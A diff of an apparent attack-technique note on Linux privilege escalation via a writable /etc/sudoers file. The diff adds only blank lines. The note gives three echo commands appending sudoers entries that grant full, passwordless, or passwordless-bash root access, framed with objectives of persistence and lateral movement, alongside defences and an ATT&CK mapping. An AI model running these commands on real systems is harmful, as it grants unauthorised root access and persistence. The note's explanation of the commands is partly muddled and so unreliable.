@@ -37,11 +37,15 @@ To execute this technique, the attacker must first identify a writable /etc/sudo
 
 This technique can be especially dangerous if the attacker is able to gain access to a highly privileged account, such as an administrator account. With this level of access, the attacker can compromise sensitive data, install malware, or take control of the entire system.
 
+ 
+
 ## Requirements
 
 1. Access to a writable /etc/sudoers file
 
 1. Access to a user account on the system
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ This technique can be especially dangerous if the attacker is able to gain acces
 
 1. Implement least privilege access controls to limit the impact of a successful privilege escalation attack
 
+ 
+
 ## Objectives
 
 1. Grant elevated privileges to a user account
@@ -58,6 +64,8 @@ This technique can be especially dangerous if the attacker is able to gain acces
 1. Maintain persistence in a system
 
 1. Move laterally within a network
+
+ 
 
 # Instructions
 
@@ -70,11 +78,19 @@ This technique can be especially dangerous if the attacker is able to gain acces
 'echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers'
 'echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers'
 
+ 
+
+
+
 **Code**: [[echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 
 #]]
 
+
+
 > This command grants SUDO access to a user on a Linux system. The 'username' parameter should be replaced with the actual username of the user you want to grant access to. The first line adds the user to the sudoers file, giving them full access to all commands. The next two lines allow the user to use SUDO without entering a password. This can be useful in certain situations, but should be used with caution.
+
+
 
 **Command** ([[Add sudo permissions for user 'username']]):
 
@@ -82,17 +98,27 @@ This technique can be especially dangerous if the attacker is able to gain acces
 echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 ```
 
+
+
+
+
 **Command** ([[Allow user 'username' to use sudo without password]]):
 
 ```bash
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 ```
 
+
+
+
+
 **Command** ([[Allow user 'username' to run /bin/bash without password]]):
 
 ```bash
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -116,3 +142,5 @@ echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 - [[Linux - Privilege Escalation]]
 - [[Writable /etc/sudoers]]
 - [[Writable files]]
+
+
